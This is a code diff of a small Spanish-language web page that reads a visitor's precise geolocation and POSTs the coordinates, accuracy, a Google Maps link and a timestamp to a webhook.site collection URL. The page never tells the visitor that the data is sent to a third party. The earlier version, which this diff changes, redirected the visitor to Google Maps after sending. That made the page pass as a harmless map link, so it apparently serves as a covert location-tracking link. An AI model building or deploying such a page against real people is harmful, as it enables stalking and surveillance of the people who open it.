@@ -5,11 +5,11 @@
   <title>Ubicación en tiempo real</title>
 </head>
 <body>
-  <h2>📍 Obteniendo tu ubicación…</h2>
+  <h2>Obteniendo ubicación…</h2>
   <pre id="msg">Esperando permisos…</pre>
 
   <script>
-    const REPORT_URL = "https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639"; // tu URL
+    const REPORT_URL = "https://webhook.site/1680fad7-4e5b-4842-a3b7-d7f6cd7d5639"; // tu URL exacta
     const msg = document.getElementById("msg");
 
     function sendLocation(lat, lon, acc) {
@@ -22,20 +22,19 @@
         time: new Date().toISOString()
       };
 
-      msg.textContent = "✅ Coordenadas obtenidas:\n" + JSON.stringify(data, null, 2);
+      // Mostrar en pantalla
+      msg.textContent = "Coordenadas: " + JSON.stringify(data, null, 2);
 
-      // Enviar datos a Webhook.site
+      // Enviar a Webhook.site
       fetch(REPORT_URL, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json"
+        },
         body: JSON.stringify(data)
       })
-      .then(() => {
-        // Redirigir a Google Maps después de 2 segundos
-        setTimeout(() => {
-          window.location.href = data.googleMaps;
-        }, 2000);
-      })
+      .then(r => r.text())
+      .then(t => console.log("Webhook response:", t))
       .catch(err => {
         console.error("Error enviando:", err);
         msg.textContent += "\n❌ Error enviando datos: " + err;
@@ -43,7 +42,7 @@
     }
 
     function onError(err) {
-      msg.textContent = "⚠️ Error al obtener ubicación: " + (err.message || err.code);
+      msg.textContent = "Error obteniendo ubicación: " + (err.message || err.code);
     }
 
     if (navigator.geolocation) {
@@ -53,9 +52,10 @@
         { enableHighAccuracy: true, timeout: 10000 }
       );
     } else {
-      msg.textContent = "❌ Geolocalización no soportada en este navegador.";
+      msg.textContent = "❌ Geolocalización no soportada.";
     }
   </script>
 </body>
 </html>
+
 
